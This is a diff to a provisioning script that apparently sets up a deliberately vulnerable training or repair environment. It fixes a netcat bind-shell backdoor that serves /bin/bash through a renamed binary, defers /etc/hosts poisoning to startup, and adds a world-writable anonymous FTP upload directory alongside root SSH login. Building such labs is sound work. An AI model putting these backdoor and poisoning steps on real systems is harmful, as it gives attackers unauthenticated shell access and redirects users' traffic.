@@ -14,8 +14,9 @@ EOF
 apt-get update
 apt-get install -y --no-install-recommends \
     jq sudo cron rsyslog procps iproute2 curl \
-    openssh-server samba netcat-openbsd \
-    telnetd vsftpd \
+    openssh-server openssh-client sshpass \
+    samba smbclient netcat-openbsd netcat-traditional telnet \
+    telnetd vsftpd ftp \
     libpam-pwquality
 
 ADMIN=$(jq -r .admin_user           "$ROLES")
@@ -52,7 +53,10 @@ chmod 0700 "$ADMIN_HOME/.ssh"
 chmod 0600 "$ADMIN_HOME/.ssh/authorized_keys"
 
 # ---- /etc/hosts poisoning ----------------------------------------------------
-cp /etc/hosts /tmp/hosts.bak && echo "10.13.37.66   $POISONED" >> /tmp/hosts.bak && cp /tmp/hosts.bak /etc/hosts 2>/dev/null || true
+# /etc/hosts is read-only at Docker build time — defer the append to the
+# supervisor (hs-start.sh) where the runtime mount is writable.
+mkdir -p /etc/sysrepair
+printf '10.13.37.66\t%s\n' "$POISONED" >/etc/sysrepair/hosts-poison.fragment
 
 # ---- PAM weak pwquality ------------------------------------------------------
 # Leave /etc/pam.d/common-password without pam_pwquality enforcing minlen.
@@ -66,13 +70,15 @@ net.ipv4.conf.all.accept_redirects=1
 EOF
 
 # ---- trojan listener ---------------------------------------------------------
+# Use nc.traditional (Ubuntu 16.04's nc.openbsd dropped -e for security, so the
+# old listener silently failed). Trojan binary is nc.traditional renamed.
 mkdir -p "$(dirname "$TROJAN")"
-cp "$(command -v nc.openbsd || command -v nc)" "$TROJAN"
+cp /bin/nc.traditional "$TROJAN"
 chmod 0755 "$TROJAN"
 cat >/usr/local/sbin/hs-backdoor.sh <<EOF
 #!/bin/bash
 while true; do
-  $TROJAN -l -p $PORT -e /bin/bash || sleep 5
+  /bin/nc.traditional -l -p $PORT -e /bin/bash || sleep 5
 done
 EOF
 chmod 0755 /usr/local/sbin/hs-backdoor.sh
@@ -114,8 +120,16 @@ anon_upload_enable=YES
 anon_mkdir_write_enable=YES
 write_enable=YES
 local_enable=YES
+secure_chroot_dir=/var/run/vsftpd/empty
+pam_service_name=vsftpd
 EOF
-mkdir -p /srv/ftp && chmod 0777 /srv/ftp
+# Keep the chroot root (ftp home) non-writable so vsftpd will serve,
+# but expose a world-writable upload subdir — the classic misconfig.
+mkdir -p /srv/ftp/upload
+chown -R ftp:ftp /srv/ftp 2>/dev/null || true
+chmod 0555 /srv/ftp
+chmod 0777 /srv/ftp/upload
+mkdir -p /var/run/vsftpd/empty
 
 # ---- sshd --------------------------------------------------------------------
 mkdir -p /var/run/sshd
@@ -124,6 +138,11 @@ sed -ri 's/^#?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
 # ---- supervisor --------------------------------------------------------------
 cat >/usr/local/sbin/hs-start.sh <<'EOF'
 #!/bin/bash
+# Apply /etc/hosts poisoning now that the runtime mount is writable.
+if [ -s /etc/sysrepair/hosts-poison.fragment ] \
+   && ! grep -Fqf /etc/sysrepair/hosts-poison.fragment /etc/hosts 2>/dev/null; then
+    cat /etc/sysrepair/hosts-poison.fragment >> /etc/hosts
+fi
 service rsyslog start    || true
 service cron    start    || true
 service smbd    start    || true
